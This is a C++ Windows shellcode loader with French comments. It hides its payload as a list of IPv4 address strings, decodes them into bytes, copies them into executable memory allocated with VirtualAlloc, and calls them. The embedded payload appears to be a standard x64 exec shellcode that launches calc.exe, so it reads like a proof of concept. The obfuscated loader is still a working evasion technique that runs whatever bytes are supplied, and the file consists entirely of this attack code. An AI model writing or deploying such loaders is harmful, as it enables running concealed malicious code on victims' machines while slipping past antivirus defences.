#include <Windows.h>
#include <iostream>
#include <vector>
#include <sstream>

using namespace std;

vector<unsigned char> ipAddressesToBytes(const vector<string>& ipAddresses) {
	vector<unsigned char> byteArray;

	for (const auto& ip : ipAddresses) {
		stringstream ss(ip);
		string segment;
		while (getline(ss, segment, '.')) {
			int byteValue = stoi(segment);
			byteArray.push_back(static_cast<unsigned char>(byteValue));
		}
	}

	return byteArray;
}

int main(int argc, char* argv[]) {
	vector<string> ipAddresses = {
	"252.72.131.228",
	"240.232.192.0",
	"0.0.65.81",
	"65.80.82.81",
	"86.72.49.210",
	"101.72.139.82",
	"96.72.139.82",
	"24.72.139.82",
	"32.72.139.114",
	"80.72.15.183",
	"74.74.77.49",
	"201.72.49.192",
	"172.60.97.124",
	"2.44.32.65",
	"193.201.13.65",
	"1.193.226.237",
	"82.65.81.72",
	"139.82.32.139",
	"66.60.72.1",
	"208.139.128.136",
	"0.0.0.72",
	"133.192.116.103",
	"72.1.208.80",
	"139.72.24.68",
	"139.64.32.73",
	"1.208.227.86",
	"72.255.201.65",
	"139.52.136.72",
	"1.214.77.49",
	"201.72.49.192",
	"172.65.193.201",
	"13.65.1.193",
	"56.224.117.241",
	"76.3.76.36",
	"8.69.57.209",
	"117.216.88.68",
	"139.64.36.73",
	"1.208.102.65",
	"139.12.72.68",
	"139.64.28.73",
	"1.208.65.139",
	"4.136.72.1",
	"208.65.88.65",
	"88.94.89.90",
	"65.88.65.89",
	"65.90.72.131",
	"236.32.65.82",
	"255.224.88.65",
	"89.90.72.139",
	"18.233.87.255",
	"255.255.93.72",
	"186.1.0.0",
	"0.0.0.0",
	"0.72.141.141",
	"1.1.0.0",
	"65.186.49.139",
	"111.135.255.213",
	"187.240.181.162",
	"86.65.186.166",
	"149.189.157.255",
	"213.72.131.196",
	"40.60.6.124",
	"10.128.251.224",
	"117.5.187.71",
	"19.114.111.106",
	"0.89.65.137",
	"218.255.213.99",
	"97.108.99.46",
	"101.120.101.0",
	};

	auto byteArray = ipAddressesToBytes(ipAddresses);
	size_t byteVarSize = byteArray.size();

	unsigned char* byteVar = new unsigned char[byteArray.size()];

	for (size_t i = 0; i < byteVarSize; ++i) {
		byteVar[i] = byteArray[i];
	}

	//LPVOID VirtualAlloc(
//	[in, optional] LPVOID lpAddress, 
//	[in]           SIZE_T dwSize,
//	[in]           DWORD  flAllocationType,
//	[in]           DWORD  flProtect
//);
// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	void* exec = VirtualAlloc(
		0,							// Si ce paramètre est NULL, le système détermine où allouer la région
		byteVarSize,				// taille du buffer (shellcode)
		MEM_COMMIT | MEM_RESERVE,	// Pour réserver et valider les pages en une étape, appelez VirtualAlloc avec MEM_COMMIT | MEM_RESERVE
		PAGE_EXECUTE_READWRITE);	// Lors de l'allocation de mémoire dynamique pour une enclave, le paramètre flProtect doit être PAGE_READWRITE ou PAGE_EXECUTE_READWRITE
	printf("Allocted memory for shellcode: %p\n", exec);

	// https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170
	memcpy(
		exec,				// dest ; Nouveau buffer
		byteVar,			// src ; Buffer à copier
		byteVarSize);		// count ; Nombre de caractères à copier
	printf("Moved shellcode into allocated memory: %p\n", exec);

	// Prend un pointeur exec (qui peut pointer vers n'importe quoi,
	// mais ici il est destiné à pointer vers une fonction ou un bloc de code exécutable).
	// Convertit exec pour qu'il soit un pointeur vers une fonction qui ne prend aucun argument et ne renvoie rien (void).
	// Appelle cette fonction.
	((void(*)())exec)();
}
